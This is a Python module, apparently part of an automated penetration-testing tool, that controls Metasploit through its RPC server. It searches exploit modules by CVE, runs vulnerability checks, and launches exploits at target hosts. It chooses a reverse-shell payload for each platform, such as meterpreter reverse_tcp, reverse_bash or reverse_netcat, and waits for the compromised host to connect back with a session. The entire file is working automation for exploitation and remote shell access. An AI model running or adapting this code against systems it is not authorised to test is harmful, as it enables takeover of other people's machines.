"""
msf.py - all Metasploit interaction over msfrpcd.

Owns CVE-to-module search, the Great/Excellent rank filter, the DoS exclusion,
console-driven check, and the fire path (payload selection, LHOST/LPORT, execute,
session attribution by exploit uuid). Concurrency-safe: pymetasploit3 issues one
requests.post per RPC call, checks use an isolated console each, and LPORTs come
from a bounded thread-safe pool. Stopping the handler job after a session lands
frees the listener without killing the session, so LPORTs are safe to reuse.

Connection config comes from the environment (MSF_RPC_HOST, MSF_RPC_PORT,
MSF_RPC_PASS, MSF_RPC_SSL, MSF_RPC_USER) with optional overrides. msfrpcd serves
SSL by default, so ssl defaults to True here even though the library default is
False.
"""

from __future__ import annotations

import logging
import os
import queue
import re
import socket
import time
from dataclasses import dataclass

from state import Candidate, Session, Verdict, verdict_from_msf

logger = logging.getLogger(__name__)

_ANSI = re.compile(r"\x1b\[[0-9;]*m")

# MSF numeric rank constants and their names.
_RANK_NAMES = {
    0: "manual", 100: "low", 200: "average", 300: "normal",
    400: "good", 500: "great", 600: "excellent",
}
_RANK_VALUES = {v: k for k, v in _RANK_NAMES.items()}

_MODULE_TYPES = ("exploit", "auxiliary", "post", "payload", "encoder", "nop", "evasion")

_PLATFORMS = (
    "windows", "linux", "unix", "osx", "android", "apple_ios", "solaris",
    "bsd", "aix", "java", "php", "python", "ruby", "nodejs", "multi",
    "firefox", "mainframe", "netware",
)


class MsfUnavailable(Exception):
    pass


@dataclass
class MsfConfig:
    host: str = "127.0.0.1"
    port: int = 55553
    password: str = ""
    ssl: bool = True
    username: str = "msf"
    check_timeout: int = 60
    exploit_timeout: int = 90
    candidates_per_service: int = 5
    rank_floor: int = 500           # Great and up
    lport_base: int = 4444
    lport_count: int = 32
    lhost: str = ""                 # optional pin; empty means derive per target

    @classmethod
    def from_env(cls, **overrides):
        cfg = cls(
            host=os.environ.get("MSF_RPC_HOST", "127.0.0.1"),
            port=int(os.environ.get("MSF_RPC_PORT", "55553")),
            password=os.environ.get("MSF_RPC_PASS", ""),
            ssl=os.environ.get("MSF_RPC_SSL", "1") not in ("0", "false", "False", "no"),
            username=os.environ.get("MSF_RPC_USER", "msf"),
        )
        for k, v in overrides.items():
            if v is not None and hasattr(cfg, k):
                setattr(cfg, k, v)
        return cfg


class MsfClient:
    def __init__(self, cfg: MsfConfig, on_activity=None):
        self.cfg = cfg
        self._on_activity = on_activity
        self._client = None
        self._lport_pool: queue.Queue = queue.Queue()
        for p in range(cfg.lport_base, cfg.lport_base + cfg.lport_count):
            self._lport_pool.put(p)

    def _activity(self, source, text):
        if not self._on_activity:
            return
        try:
            self._on_activity(source, text)
        except Exception:
            pass

    # -- connection --

    def connect(self):
        if not self.cfg.password:
            raise MsfUnavailable("MSF_RPC_PASS is empty; msfrpcd password required")
        try:
            from pymetasploit3.msfrpc import MsfRpcClient
        except Exception as e:
            raise MsfUnavailable(f"pymetasploit3 not installed: {e}")
        try:
            self._client = MsfRpcClient(
                self.cfg.password, server=self.cfg.host, port=self.cfg.port,
                ssl=self.cfg.ssl, username=self.cfg.username)
        except Exception as e:
            raise MsfUnavailable(
                f"cannot connect to msfrpcd at {self.cfg.host}:{self.cfg.port}: {e}")
        try:
            ver = self._client.core.version
        except Exception as e:
            raise MsfUnavailable(f"msfrpcd auth/probe failed: {e}")
        logger.info("msfrpcd connected: %s", ver)
        return self

    def close(self):
        if self._client is not None:
            try:
                self._client.logout()
            except Exception:
                pass

    def db_status(self):
        """Raw msfrpcd database status dict, or None if the call fails."""
        try:
            return self._client.db.status
        except Exception as e:
            logger.debug("db.status failed: %s", e)
            return None

    def db_ready(self, probe_cve="CVE-2017-0144", slow_threshold=3.0):
        """True if the postgres cache is connected. Primary signal is db.status
        reporting a connected db; fallback is a timed search, since an uncached
        search is markedly slower than a cached one."""
        st = self.db_status()
        if isinstance(st, dict) and st.get("db"):
            return True
        start = time.time()
        try:
            self._client.modules.search("cve:" + probe_cve)
        except Exception:
            return False
        return (time.time() - start) < slow_threshold

    # -- search and candidate assembly --

    def _search_cve(self, cve_id):
        try:
            res = self._client.modules.search("cve:" + cve_id)
        except Exception as e:
            logger.warning("module search failed for %s: %s", cve_id, e)
            return []
        return res or []

    def _acceptable(self, entry):
        if entry.get("type") != "exploit":
            return False
        full = entry.get("fullname", "")
        if "dos" in full.split("/"):
            return False
        if _rank_value(entry.get("rank")) < self.cfg.rank_floor:
            return False
        return True

    def candidates_for_service(self, service):
        """Search every CVE on the service, filter to fireable exploit modules,
        dedup, rank-sort, and cap. Returns a list of Candidate (unchecked)."""
        label = service.product or service.name or "service"
        self._activity("msf", f"search exploits {label} :{service.port} "
                              f"({len(service.cves)} cve)")
        by_module = {}
        for cve in service.cves:
            for entry in self._search_cve(cve.cve_id):
                if not self._acceptable(entry):
                    continue
                full = entry.get("fullname", "")
                cur = by_module.get(full)
                if cur is None or cve.cvss > cur[2]:
                    by_module[full] = (entry, cve.cve_id, cve.cvss)
        ranked = sorted(by_module.values(),
                        key=lambda t: _rank_value(t[0].get("rank")), reverse=True)
        ranked = ranked[: self.cfg.candidates_per_service]
        out = []
        for entry, cve_id, _cvss in ranked:
            out.append(Candidate(
                module=entry.get("fullname", ""), cve_id=cve_id,
                rank=_rank_name(entry.get("rank")), port=service.port, source="msf"))
        return out

    # -- check (console path) --

    def check(self, candidate, rhost, port):
        """Run the module check on a fresh isolated console. Returns
        (Verdict, detail_text)."""
        self._activity("msf", f"check {candidate.module} @ {rhost}:{port}")
        cid = None
        try:
            console = self._client.consoles.console()
            cid = console.cid
            lines = [
                f"use {candidate.module}",
                f"set RHOSTS {rhost}",
            ]
            if port:
                lines.append(f"set RPORT {int(port)}")
            lines.append("check")
            data = self._console_run(console, "\n".join(lines) + "\n",
                                     self.cfg.check_timeout)
            code = _parse_check_output(data)
            return verdict_from_msf(code), _summarize_check(data)
        except Exception as e:
            logger.warning("check error %s on %s: %s", candidate.module, rhost, e)
            return Verdict.UNKNOWN, f"check error: {e}"
        finally:
            if cid is not None:
                try:
                    self._client.consoles.destroy(cid)
                except Exception:
                    pass

    def _console_run(self, console, cmd, timeout):
        try:
            console.read()  # clear buffer
        except Exception:
            pass
        console.write(cmd)
        data = ""
        start = time.time()
        while True:
            time.sleep(0.5)
            try:
                data += console.read().get("data", "")
            except Exception:
                break
            busy = False
            try:
                busy = bool(console.is_busy())
            except Exception:
                busy = False
            if not busy and data.strip():
                break
            if time.time() - start > timeout:
                break
        return data

    # -- fire --

    def fire(self, candidate, host, rhost, port):
        """Detonate the module against rhost with a selected reverse payload.
        Returns a Session on success, or None. The handler job is always stopped
        in teardown, which frees the LPORT and leaves any session intact."""
        lport = self._lport_acquire()
        if lport is None:
            logger.warning("LPORT pool exhausted; skipping fire %s on %s",
                           candidate.module, rhost)
            return None
        job_id = None
        try:
            modref = _strip_type(candidate.module)
            exploit = self._client.modules.use("exploit", modref)
            self._set_rhost(exploit, rhost, port)
            payload_name = _select_payload(exploit, candidate.module, host)
            if payload_name is None:
                logger.warning("no compatible payload for %s", candidate.module)
                return None
            payload = self._client.modules.use("payload", payload_name)
            lhost = self.cfg.lhost or _lhost_for(rhost)
            if not lhost:
                logger.warning("could not derive LHOST for %s", rhost)
                return None
            _set_if_present(payload, "LHOST", lhost)
            _set_if_present(payload, "LPORT", int(lport))
            self._activity("fire", f"execute {candidate.module} "
                                   f"payload={payload_name} LHOST={lhost} "
                                   f"LPORT={lport} @ {rhost}")
            result = exploit.execute(payload=payload)
            if not isinstance(result, dict) or not result.get("uuid"):
                logger.warning("execute returned no uuid for %s: %s",
                               candidate.module, result)
                return None
            uuid = result.get("uuid")
            job_id = result.get("job_id")
            matched = self._await_session(uuid, self.cfg.exploit_timeout)
            if matched is None:
                return None
            sid, sdict = matched
            return Session(
                session_id=str(sid), module=candidate.module, payload=payload_name,
                info=str(sdict.get("info") or sdict.get("desc") or ""))
        except Exception as e:
            logger.warning("fire error %s on %s: %s", candidate.module, rhost, e)
            return None
        finally:
            if job_id is not None:
                try:
                    self._client.jobs.stop(str(job_id))
                except Exception:
                    pass
            self._lport_release(lport)

    def _await_session(self, uuid, timeout):
        start = time.time()
        while time.time() - start < timeout:
            try:
                sessions = self._client.sessions.list
            except Exception:
                sessions = {}
            for sid, s in sessions.items():
                if s.get("exploit_uuid") == uuid:
                    return sid, s
            time.sleep(1.0)
        return None

    def _set_rhost(self, mod, rhost, port):
        opts = list(mod.options)
        if "RHOSTS" in opts:
            mod["RHOSTS"] = rhost
        elif "RHOST" in opts:
            mod["RHOST"] = rhost
        if port and "RPORT" in opts:
            try:
                mod["RPORT"] = int(port)
            except Exception:
                pass

    # -- LPORT pool --

    def _lport_acquire(self, timeout=30):
        try:
            return self._lport_pool.get(timeout=timeout)
        except queue.Empty:
            return None

    def _lport_release(self, port):
        if port is not None:
            self._lport_pool.put(port)


# --- module helpers (no live server required) ------------------------------

def _rank_value(rank):
    if isinstance(rank, bool):
        return 0
    if isinstance(rank, (int, float)):
        return int(rank)
    if isinstance(rank, str):
        r = rank.strip().lower()
        if r.isdigit():
            return int(r)
        return _RANK_VALUES.get(r, 0)
    return 0


def _rank_name(rank):
    if isinstance(rank, bool):
        return "unknown"
    if isinstance(rank, (int, float)):
        return _RANK_NAMES.get(int(rank), str(int(rank)))
    if isinstance(rank, str):
        r = rank.strip().lower()
        if r.isdigit():
            return _RANK_NAMES.get(int(r), r)
        return r
    return "unknown"


def _strip_type(full):
    parts = full.split("/", 1)
    if parts[0] in _MODULE_TYPES and len(parts) > 1:
        return parts[1]
    return full


def _platform_from_module(full):
    parts = full.split("/")
    if len(parts) >= 2 and parts[1] in _PLATFORMS:
        seg = parts[1]
        return None if seg == "multi" else seg
    return None


def _platform_from_host(host):
    text = f"{getattr(host, 'os_match', '')}".lower()
    if not text:
        return None
    if "windows" in text:
        return "windows"
    if "linux" in text:
        return "linux"
    if "mac os" in text or "osx" in text or "darwin" in text:
        return "osx"
    if any(x in text for x in ("unix", "bsd", "solaris", "aix")):
        return "unix"
    return None


def _is_x64(host):
    arch = f"{getattr(host, 'arch', '')}".lower()
    if arch in ("x64", "x86_64", "amd64", "64", "x86-64"):
        return True
    text = f"{getattr(host, 'os_match', '')}".lower()
    return "x64" in text or "64-bit" in text or "x86_64" in text


def _payload_prefs(platform, x64):
    prefs = []
    if platform == "windows":
        if x64:
            prefs += [
                "windows/x64/meterpreter/reverse_tcp",
                "windows/x64/meterpreter_reverse_tcp",
                "windows/x64/shell/reverse_tcp",
                "windows/x64/shell_reverse_tcp",
            ]
        prefs += [
            "windows/meterpreter/reverse_tcp",
            "windows/meterpreter_reverse_tcp",
            "windows/shell/reverse_tcp",
            "windows/shell_reverse_tcp",
        ]
    elif platform == "linux":
        if x64:
            prefs += [
                "linux/x64/meterpreter/reverse_tcp",
                "linux/x64/meterpreter_reverse_tcp",
                "linux/x64/shell/reverse_tcp",
                "linux/x64/shell_reverse_tcp",
            ]
        prefs += [
            "linux/x86/meterpreter/reverse_tcp",
            "linux/x86/meterpreter_reverse_tcp",
            "linux/x86/shell/reverse_tcp",
            "linux/x86/shell_reverse_tcp",
        ]
    elif platform == "osx":
        prefs += [
            "osx/x64/meterpreter/reverse_tcp",
            "osx/x64/shell_reverse_tcp",
        ]
    elif platform == "unix":
        prefs += [
            "cmd/unix/reverse_bash",
            "cmd/unix/reverse",
            "cmd/unix/reverse_netcat",
            "cmd/unix/reverse_python",
            "cmd/unix/reverse_perl",
        ]
    elif platform == "java":
        prefs += ["java/meterpreter/reverse_tcp", "java/jsp_shell_reverse_tcp"]
    elif platform == "php":
        prefs += ["php/meterpreter/reverse_tcp", "php/reverse_php"]
    elif platform == "python":
        prefs += ["python/meterpreter/reverse_tcp", "python/shell_reverse_tcp"]
    # generic reverse fallbacks, always last
    prefs += ["generic/shell_reverse_tcp", "cmd/unix/reverse_bash", "cmd/unix/reverse"]
    return prefs


def _select_payload(exploit, full_module, host):
    """Pick the best reverse payload from the module's compatible set, matched to
    platform/arch. Falls back to any reverse payload, then warns and takes the
    first compatible payload (likely bind) only as a last resort."""
    try:
        compat = set(exploit.payloads or [])
    except Exception as e:
        logger.warning("could not list payloads for %s: %s", full_module, e)
        compat = set()
    if not compat:
        return None
    platform = _platform_from_module(full_module) or _platform_from_host(host)
    x64 = _is_x64(host)
    for p in _payload_prefs(platform, x64):
        if p in compat:
            return p
    for p in sorted(compat):
        if "reverse" in p and "bind" not in p:
            return p
    fallback = sorted(compat)[0]
    logger.warning("no reverse payload for %s; falling back to %s",
                   full_module, fallback)
    return fallback


def _set_if_present(mod, key, val):
    try:
        if key in list(mod.options):
            mod[key] = val
    except Exception:
        pass


def _parse_check_output(text):
    """Map MSF check console output to a CheckCode name for verdict_from_msf.
    Order matters: unsupported and safe phrases are tested before the positive
    vulnerable phrase so 'not vulnerable' is not misread as vulnerable."""
    t = _ANSI.sub("", text or "").lower()
    if ("does not support check" in t or "check is not supported" in t
            or "no check" in t):
        return "unsupported"
    if "appears to be vulnerable" in t or "appears vulnerable" in t:
        return "appears"
    if ("is not exploitable" in t or "not vulnerable" in t
            or "does not appear to be vulnerable" in t
            or "target is not" in t):
        return "safe"
    if "is vulnerable" in t or "target is vulnerable" in t:
        return "vulnerable"
    if ("cannot reliably check" in t or "unable to" in t
            or "could not connect" in t or "connection refused" in t
            or "failed to connect" in t):
        return "unknown"
    return "unknown"


def _summarize_check(text):
    clean = _ANSI.sub("", text or "")
    keep = [ln.strip() for ln in clean.splitlines()
            if any(k in ln.lower() for k in ("vulnerable", "exploitable", "check"))]
    if keep:
        return " | ".join(keep[-3:])[:240]
    tail = clean.strip().splitlines()
    return (tail[-1] if tail else "")[:240]


def _lhost_for(target):
    """Source IP the kernel would use to reach target. UDP connect consults the
    routing table without sending packets, so this works offline."""
    fam = socket.AF_INET6 if ":" in target else socket.AF_INET
    s = socket.socket(fam, socket.SOCK_DGRAM)
    try:
        s.connect((target, 9))
        return s.getsockname()[0]
    except Exception:
        return None
    finally:
        s.close()


__all__ = ["MsfConfig", "MsfClient", "MsfUnavailable"]
